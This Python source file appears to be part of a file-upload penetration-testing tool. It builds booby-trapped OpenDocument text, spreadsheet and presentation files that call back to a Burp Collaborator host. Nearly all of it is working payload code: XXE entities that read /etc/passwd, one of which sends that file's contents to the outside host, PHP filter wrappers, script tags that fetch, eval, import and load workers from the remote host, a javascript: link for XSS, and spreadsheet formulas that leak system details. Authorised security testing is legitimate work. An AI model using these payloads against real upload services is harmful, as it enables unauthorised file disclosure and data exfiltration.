from pathlib import Path
import zipfile
import tempfile

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_office_payloads(output_dir, ext, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    extensions = {
        'odt': ('office:document', 'office:text'),
        'ods': ('office:document', 'office:spreadsheet'),
        'odp': ('office:document', 'office:presentation'),
    }
    
    if ext not in extensions:
        return
    
    root_ns, body_ns = extensions[ext]
    ext_dir = output_dir
    ext_dir.mkdir(parents=True, exist_ok=True)
    
    if should_generate_type('ssrf'):
        ssrf_dir = ext_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('xxe'):
        xxe_dir = ext_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = ext_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = ext_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    if should_generate_type('info'):
        info_dir = ext_dir / 'info'
        info_dir.mkdir(exist_ok=True)
    
    if ext == 'ods':
        ods_info1_cell_filename = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<office:spreadsheet>
<table:table>
<table:table-row>
<table:table-cell office:value-type="string">
<text:p>=CELL("filename")</text:p>
</table:table-cell>
</table:table-row>
</table:table>
</office:spreadsheet>
</office:body>
</office:document>'''
        
        if should_generate_type('info'):
            output_file = info_dir / "info1_cell_filename.ods"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                (temp_path / "content.xml").write_text(ods_info1_cell_filename)
                (temp_path / "META-INF").mkdir()
                (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
                (temp_path / "meta.xml").write_text('<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"><office:meta><meta:initial-creator>=CELL("filename")</meta:initial-creator></office:meta></office:document-meta>')
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    for file_path in temp_path.rglob('*'):
                        if file_path.is_file():
                            arcname = file_path.relative_to(temp_path)
                            zip_ref.write(file_path, arcname)
        
        if should_generate_type('info'):
            for formula, name in [('=INFO("version")', 'info2_info_version'), ('=INFO("system")', 'info3_info_system'), ('=NOW()', 'info4_now'), ('=INFO("directory")', 'info5_info_directory')]:
                ods_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<office:spreadsheet>
<table:table>
<table:table-row>
<table:table-cell office:value-type="string">
<text:p>{formula}</text:p>
</table:table-cell>
</table:table-row>
</table:table>
</office:spreadsheet>
</office:body>
</office:document>'''
                
                output_file = info_dir / f"{name}.ods"
                with tempfile.TemporaryDirectory() as temp_dir:
                    temp_path = Path(temp_dir)
                    (temp_path / "content.xml").write_text(ods_content)
                    (temp_path / "META-INF").mkdir()
                    (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
                    (temp_path / "meta.xml").write_text(f'<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"><office:meta><meta:initial-creator>{formula}</meta:initial-creator></office:meta></office:document-meta>')
                    
                    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        for file_path in temp_path.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_path)
                                zip_ref.write(file_path, arcname)
    
    if ext == 'odt':
        if should_generate_type('info'):
            for formula, name in [('=CELL("filename")', 'info1_cell_filename'), ('=INFO("version")', 'info2_info_version'), ('=INFO("system")', 'info3_info_system'), ('=NOW()', 'info4_now'), ('=INFO("directory")', 'info5_info_directory')]:
                odt_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<office:text>
<text:p>{formula}</text:p>
</office:text>
</office:body>
</office:document>'''
                
                output_file = info_dir / f"{name}.odt"
                with tempfile.TemporaryDirectory() as temp_dir:
                    temp_path = Path(temp_dir)
                    (temp_path / "content.xml").write_text(odt_content)
                    (temp_path / "META-INF").mkdir()
                    (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
                    (temp_path / "meta.xml").write_text(f'<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"><office:meta><meta:initial-creator>{formula}</meta:initial-creator></office:meta></office:document-meta>')
                    
                    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        for file_path in temp_path.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_path)
                                zip_ref.write(file_path, arcname)
    
    odt_xxe1_doctype = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-{ext}-1">
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>test</text:p>
</{body_ns}>
</office:body>
</office:document>'''
    
    if should_generate_type('xxe'):
        output_file = xxe_dir / f"xxe1_doctype.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_xxe1_doctype)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_xxe2_parameter = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-{ext}-2">
%xxe;
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>test</text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = xxe_dir / f"xxe2_parameter.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_xxe2_parameter)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_xxe3_file = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>&xxe;</text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = xxe_dir / f"xxe3_file.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_xxe3_file)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_xxe4_nested = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "{base_url}/xxe-{ext}-nested">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-{ext}-exfil?data=%file;'>">
%remote;
%eval;
%exfil;
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>test</text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = xxe_dir / f"xxe4_nested.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_xxe4_nested)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_xxe5_php = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource={base_url}/xxe-{ext}-php">
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>&xxe;</text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = xxe_dir / f"xxe5_php.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_xxe5_php)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    if should_generate_type('ssrf'):
        odt_ssrf1_hyperlink = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink">
<office:body>
<{body_ns}>
<text:p>
<text:a xlink:href="{base_url}/ssrf-{ext}-1">click</text:a>
</text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = ssrf_dir / f"ssrf1_hyperlink.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_ssrf1_hyperlink)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_ssrf2_https = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink">
<office:body>
<{body_ns}>
<text:p>
<text:a xlink:href="https://{burp_collab}/ssrf-{ext}-2">click</text:a>
</text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = ssrf_dir / f"ssrf2_https.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_ssrf2_https)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_ssrf3_image = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink">
<office:body>
<{body_ns}>
<draw:frame>
<draw:image xlink:href="{base_url}/ssrf-{ext}-img"/>
</draw:frame>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = ssrf_dir / f"ssrf3_image.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_ssrf3_image)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    if should_generate_type('rce') or should_generate_type('deserialization'):
        odt_rce1_script = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<{body_ns}>
<text:p><script>fetch('{base_url}/rce-{ext}-js')</script></text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = rce_dir / f"rce1_script.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_rce1_script)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_rce2_eval = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<{body_ns}>
<text:p><script>eval('fetch(\\'{base_url}/rce-{ext}-eval\\')')</script></text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = rce_dir / f"rce2_eval.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_rce2_eval)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_rce3_function = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<{body_ns}>
<text:p><script>Function('fetch(\\'{base_url}/rce-{ext}-function\\')')()</script></text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = rce_dir / f"rce3_function.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_rce3_function)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_rce4_import = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<{body_ns}>
<text:p><script type="module">import('{base_url}/rce-{ext}-import')</script></text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = rce_dir / f"rce4_import.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_rce4_import)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        odt_rce5_worker = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<{body_ns}>
<text:p><script>var w=new Worker('{base_url}/rce-{ext}-worker');w.onmessage=()=>fetch('{base_url}/rce-{ext}-worker?exec=true')</script></text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = rce_dir / f"rce5_worker.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_rce5_worker)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    if should_generate_type('xss'):
        odt_xss1_hyperlink = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink">
<office:body>
<{body_ns}>
<text:p text:style-name="P1">
<text:a xlink:href="javascript:alert(1)">click</text:a>
</text:p>
</{body_ns}>
</office:body>
</office:document>'''
        
        output_file = xss_dir / f"xss1_hyperlink.{ext}"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(odt_xss1_hyperlink)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    master_file = ext_dir / f"master.{ext}"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "content.xml").write_text(odt_xxe1_doctype)
        (temp_path / "META-INF").mkdir()
        (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
        
        with zipfile.ZipFile(master_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
        
        if generate_ssti_filename_payloads and should_generate_type('ssti'):
            generate_ssti_filename_payloads(output_dir, ext, burp_collab, tech_filter)
        
        if generate_xss_filename_payloads and should_generate_type('xss'):
            generate_xss_filename_payloads(output_dir, ext, burp_collab, tech_filter)
